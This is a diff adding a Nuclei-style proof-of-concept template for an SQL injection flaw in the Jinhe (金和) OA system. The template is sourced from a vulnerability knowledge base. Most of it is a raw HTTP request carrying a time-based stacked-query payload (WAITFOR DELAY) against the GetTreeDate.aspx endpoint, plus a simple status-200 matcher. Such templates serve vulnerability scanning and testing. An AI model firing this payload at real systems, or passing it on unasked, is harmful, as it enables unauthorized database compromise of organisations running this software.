@@ -1,0 +1,55 @@
+id: poc-ty0nftdw7psm32gw
+info:
+  name: 金和OA SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ty0nftdw7psm32gw'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ty0nftdw7psm32gw
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1;WAITFOR+DELAY+%270:0:5%27+--%20and%201=1 HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Cookie: ASP.NET_SessionId=4nichsprxl5ruhtbk5lywfdb
+
+
+    DNT: 1
+
+
+    Connection: close
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    GetTreeDate.aspx
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
